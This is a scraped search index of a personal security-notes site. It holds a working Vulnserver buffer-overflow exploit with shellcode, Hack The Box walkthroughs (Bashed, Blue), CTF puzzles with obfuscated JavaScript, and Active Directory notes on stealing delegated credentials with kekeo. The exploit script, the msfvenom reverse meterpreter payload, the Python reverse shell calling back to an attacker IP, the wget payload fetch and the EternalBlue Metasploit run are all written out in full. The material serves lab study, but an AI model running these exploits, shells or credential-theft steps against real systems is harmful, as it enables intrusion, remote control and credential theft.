\u0026quot;\\xe1\\xa8\\x39\\x6f\\x10\\xb0\\x7e\\x57\\xcb\\xc7\\x76\\xa4\\x76\\xd0\\x4c\u0026quot; \u0026quot;\\xd7\\xac\\x55\\x57\\x7f\\x26\\xcd\\xb3\\x7e\\xeb\\x88\\x30\\x8c\\x40\\xde\u0026quot; \u0026quot;\\x1f\\x90\\x57\\x33\\x14\\xac\\xdc\\xb2\\xfb\\x25\\xa6\\x90\\xdf\\x6e\\x7c\u0026quot; \u0026quot;\\xb8\\x46\\xca\\xd3\\xc5\\x99\\xb5\\x8c\\x63\\xd1\\x5b\\xd8\\x19\\xb8\\x31\u0026quot; \u0026quot;\\x1f\\xaf\\xc6\\x77\\x1f\\xaf\\xc8\\x27\\x48\\x9e\\x43\\xa8\\x0f\\x1f\\x86\u0026quot; \u0026quot;\\x8d\\xe0\\x55\\x8b\\xa7\\x68\\x30\\x59\\xfa\\xf4\\xc3\\xb7\\x38\\x01\\x40\u0026quot; \u0026quot;\\x32\\xc0\\xf6\\x58\\x37\\xc5\\xb3\\xde\\xab\\xb7\\xac\\x8a\\xcb\\x64\\xcc\u0026quot; \u0026quot;\\x9e\\xaf\\xeb\\x5e\\x42\\x1e\\x8e\\xe6\\xe1\\x5e\u0026quot;;  #!/usr/bin/python import socket,sys address = '192.168.136.130' port = 9999 offset = 2003 shellcode = b\u0026quot;\\xbb\\xbb\\x2a\\xfd\\xc1\\xdb\\xd4\\xd9\\x74\\x24\\xf4\\x5d\\x33\\xc9\\xb1\\x31\\x83\\xed\\xfc\\x31\\x5d\\x0f\\x03\\x5d\\xb4\\xc8\\x08\\x3d\\x22\\x8e\\xf3\\xbe\\xb2\\xef\\x7a\\x5b\\x83\\x2f\\x18\\x2f\\xb3\\x9f\\x6a\\x7d\\x3f\\x6b\\x3e\\x96\\xb4\\x19\\x97\\x99\\x7d\\x97\\xc1\\x94\\x7e\\x84\\x32\\xb6\\xfc\\xd7\\x66\\x18\\x3d\\x18\\x7b\\x59\\x7a\\x45\\x76\\x0b\\xd3\\x01\\x25\\xbc\\x50\\x5f\\xf6\\x37\\x2a\\x71\\x7e\\xab\\xfa\\x70\\xaf\\x7a\\x71\\x2b\\x6f\\x7c\\x56\\x47\\x26\\x66\\xbb\\x62\\xf0\\x1d\\x0f\\x18\\x03\\xf4\\x5e\\xe1\\xa8\\x39\\x6f\\x10\\xb0\\x7e\\x57\\xcb\\xc7\\x76\\xa4\\x76\\xd0\\x4c\\xd7\\xac\\x55\\x57\\x7f\\x26\\xcd\\xb3\\x7e\\xeb\\x88\\x30\\x8c\\x40\\xde\\x1f\\x90\\x57\\x33\\x14\\xac\\xdc\\xb2\\xfb\\x25\\xa6\\x90\\xdf\\x6e\\x7c\\xb8\\x46\\xca\\xd3\\xc5\\x99\\xb5\\x8c\\x63\\xd1\\x5b\\xd8\\x19\\xb8\\x31\\x1f\\xaf\\xc6\\x77\\x1f\\xaf\\xc8\\x27\\x48\\x9e\\x43\\xa8\\x0f\\x1f\\x86\\x8d\\xe0\\x55\\x8b\\xa7\\x68\\x30\\x59\\xfa\\xf4\\xc3\\xb7\\x38\\x01\\x40\\x32\\xc0\\xf6\\x58\\x37\\xc5\\xb3\\xde\\xab\\xb7\\xac\\x8a\\xcb\\x64\\xcc\\x9e\\xaf\\xeb\\x5e\\x42\\x1e\\x8e\\xe6\\xe1\\x5e\u0026quot; buff = b\u0026quot;\u0026quot; # empty byte var buff += b\u0026quot;A\u0026quot;*offset # junk buff += b\u0026quot;\\xAF\\x11\\x50\\x62\u0026quot; # EIP to JMP ESP buff += b\u0026quot;\\x90\u0026quot;*32 # NOP sled buff += b\u0026quot;%s\u0026quot; % shellcode # add shellcode to buffer try: print(f'[+] Sending buffer: {str(len(buff))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024)\ts.send(b\u0026quot;TRUN /.:/%s\u0026quot; % buff) except RuntimeError as err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.close()  Exploit "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/vulnserver/",
	"title": "Vulnserver",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/activedirectory/",
	"title": "ActiveDirectory",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/bashed/",
	"title": "Bashed",
	"tags": ["HTB"],
	"description": "Notes from the Bashed machine on HTB.",
	"content": "bashed where you at 10.10.10.68\nwhat you got nmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (1 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (1 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    Nikto   Related files   nikto.txt  (1 kb)    Gobuster   Related files   gobuster_dir_med-txt-html.txt  (0 kb)    /dev = php shell\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f elf \u0026gt; notmalware.elf    Related files   notmalware.elf  (0 kb)    sudo -l Matching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL  sudo -u scriptmanager /bin/bash -i scriptmanager@bashed:/tmp$ ls -la / ls -la / total 88 drwxr-xr-x 23 root root 4096 Dec 4 2017 . drwxr-xr-x 23 root root 4096 Dec 4 2017 .. .... drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jan 24 15:40 scripts .... scriptmanager@bashed:/scripts$ ls -la ls -la total 16 drwxrwxr-- 2 scriptmanager scriptmanager 4096 Jan 24 15:40 . drwxr-xr-x 23 root root 4096 Dec 4 2017 .. -rw-r--r-- 1 scriptmanager scriptmanager 213 Jan 24 15:39 test.py -rw-r--r-- 1 root root 12 Jan 24 15:30 test.txt  import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\u0026quot;10.10.14.24\u0026quot;,4455)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;])    Related files   test.py  (0 kb)    root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# vim test.py root@kali:/mnt/hgfs/_shared_folder/htb/boxes/bashed/web# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.68 - - [25/Jan/2020 00:39:59] \u0026quot;GET /test.py HTTP/1.1\u0026quot; 200 -  scriptmanager@bashed:/scripts$ wget http://10.10.14.24/test.py wget http://10.10.14.24/test.py --2020-01-24 15:39:19-- http://10.10.14.24/test.py Connecting to 10.10.14.24:80... connected. HTTP request sent, awaiting response... 200 OK  root@kali:~# nc -nlvp 4445 listening on [any] 4445 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.68] 57362 /bin/sh: 0: can't access tty; job control turned off # whoami root  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/blue/",
	"title": "Blue",
	"tags": ["HTB"],
	"description": "Notes from the Blue machine on HTB.",
	"content": "blue where you at 10.10.10.40\nwhat you got nmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (3 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    # Nmap 7.80 scan initiated Thu Jan 23 16:56:13 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/blue/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/blue/scans/full_tcp.gnmap 10.10.10.40 Nmap scan report for 10.10.10.40 Host is up (0.019s latency). Not shown: 65526 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=1/23%OT=135%CT=1%CU=32587%PV=Y%DS=2%DC=T%G=Y%TM=5E29C2 OS:95%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=I%CI=I%II=I%TS=7)SE OS:Q(SP=101%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M54DNW8ST11%O2=M5 OS:4DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN( OS:W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%TG=80%W=200 OS:0%O=M54DNW8NNS%CC=N%Q=)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1( OS:R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0 OS:%Q=)T2(R=Y%DF=Y%TG=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%TG=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T3( OS:R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%TG=80%W=0%S=A%A=O% OS:F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T OS:G=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=% OS:RD=0%Q=)T6(R=Y%DF=Y%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W= OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%DF=N%T=80%IP OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%TG=80%CD=Z)IE( OS:R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 43s, deviation: 2s, median: 42s | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-01-23T15:58:49+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-23T15:58:50 |_ start_date: 2020-01-23T15:56:12 TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 18.81 ms 10.10.14.1 2 19.07 ms 10.10.10.40 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jan 23 16:58:13 2020 -- 1 IP address (1 host up) scanned in 121.19 seconds  nmap -p 135,139,445,49152-49157 --script=vuln 10.10.10.40 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 17:08 CET Nmap scan report for 10.10.10.40 Host is up (0.020s latency). PORT STATE SERVICE 135/tcp open msrpc |_clamav-exec: ERROR: Script execution failed (use -d to debug) 139/tcp open netbios-ssn |_clamav-exec: ERROR: Script execution failed (use -d to debug) 445/tcp open microsoft-ds |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49152/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49153/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49154/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49155/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49156/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) 49157/tcp open unknown |_clamav-exec: ERROR: Script execution failed (use -d to debug) Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx Nmap done: 1 IP address (1 host up) scanned in 110.04 seconds  msf5 exploit(windows/smb/ms17_010_psexec) \u0026gt; set rhost 10.10.10.40 rhost =\u0026gt; 10.10.10.40 msf5 exploit(windows/smb/ms17_010_psexec) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave blank for auto) NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 10.10.10.40 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 445 yes The Target port SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(windows/smb/ms17_010_psexec) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Automatic 1 PowerShell 2 Native upload 3 MOF upload msf5 exploit(windows/smb/ms17_010_psexec) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.23:4444 [*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1 [*] 10.10.10.40:445 - Built a write-what-where primitive... [+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained! [*] 10.10.10.40:445 - Selecting PowerShell target [*] 10.10.10.40:445 - Executing the payload... [+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (180291 bytes) to 10.10.10.40 [*] Meterpreter session 1 opened (10.10.14.23:4444 -\u0026gt; 10.10.10.40:49158) at 2020-01-23 17:11:19 +0100 meterpreter \u0026gt;  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/graficomspoorzoeker/challanges/",
	"title": "Challanges",
	"tags": ["Graficom Spoorzoeker"],
	"description": "Challanges of the Graficom Spoorzoeker",
	"content": "Challanges 0/4 Wat een ROT ding: uggcf://cnfgrova.pbz/enj/a38UseHF\n50 65 72 64 6f 6b 27 73 20 73 70 6f 6f 72 7a 6f 65 6b 65 72 20 21 54 68 69 6e 67 73 20 61 72 65 20 6e 6f 74 20 61 73 20 74 68 65 79 20 73 65 65 6d 2c 20 73 6f 20 49 20 77 69 6c 6c 20 62 72 69 6e 67 20 79 6f 75 20 75 70 20 74 6f 20 73 70 65 65 64 2e 0a 4d 69 72 72 6f 72 20 74 68 65 20 42 61 73 65 20 61 6e 64 20 79 6f 75 20 77 69 6c 6c 20 73 75 63 63 65 65 64 2e 20  1/4 c2l0YXJH\n2/4 https://pastebin.com/raw/vtSB7yUG\nᄅ/ㄣ ɔɯΛuɔuΛᴉqMℲI\n3/4 https://pastebin.com/raw/P1q6GrUZ\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+([][[]]+[])[!+[]+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[+!+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()  4/4 https://pastebin.com/raw/cDjx1QgT\nhttps://i.imgur.com/zzX3Ed1.png\nHint: DarkByte\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/active-directory/credential-access/",
	"title": "credentialaccess",
	"tags": ["ActiveDirectory"],
	"description": "credentialaccess description.",
	"content": "Dumping Delegated Default Kerberos and NTLM Credentials w/o Touching LSASS This is possible due to Active Directory feature called Credentials Delegation.\nCredential Delegation Credential Delegation is a feature that allows domain administartors to authorize certain machines or to be more precise - certain SPNs, to accept delegated passwords. In other words, this means that certain services on certain machines can be set to allow users to authenticate without the need to supply their credentials interactively - almost like a Single Sign On.\nDumping Kerberos Credentials If credential delegation is set up, credentials can be dumped without touching lsass with a tool called kekeo.\nLet\u0026rsquo;s spin up a tsssp named pipe server where targets of whom the credentials we want to steal, will connect to, on the compromised workstation ws01 (running as SYSTEM):\n// needs to run as NT SYSTEM tsssp::server  Now, let\u0026rsquo;s connect to the tsssp server on ws01 from the target computer ws02 (we want currently logged on user\u0026rsquo;s from ws02 credentials to be stolen by being sent to the tsssp server on ws01 over the named pipe):\ntsssp::client /target:termsrv/ws01.offense.local /pipe:\\\\ws01.offense.local\\pipe\\kekeo_tsssp_endpoint  Dumping NTLM Credentials The same technique applies to NTLM authentication. For the technique to work with NTLM credentials, below needs to be enabled in AD in Computer Configuration \u0026gt; Policies \u0026gt; Administrative Templates \u0026gt; System \u0026gt; Credential Delegation:\nDifferently from dumping kerberos credentials, the NTLM delegated credential dumping attack can be performed locally on the target system - we only need two kekeo instances running as low privileged users, unlike with kerberos credential dumping where the tsssp server had to be running as SYSTEM.\nLet\u0026rsquo;s spin up the server on one console:\n// running as ws02\\spotless tsssp::server  And connect to it from another console:\n// running as ws02\\spotless tsssp::client /target:termsrv/ws02.offense.local  Enumerating Delegated Credentials Locally Once on the box, we can check if credential delegation is turned on:\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation  Below shows what credential delegation is enabled on the system (represented with 0x1):\nWe can then check what SPNs accept delegated credentials:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials  Below shows that the box we have access to is allowed to delegate credentials to all termsrv SPNs - all RDP services:\nEnumerating Delegated Credentials via AD gpresult /h report.html ## or Get-GPOReport if you have access to AD admin tools  Additionally, we can use Parse-Polfile to parse the registry.pol of the linked GPO. First of, let\u0026rsquo;s find the GPO that is being applied to the user 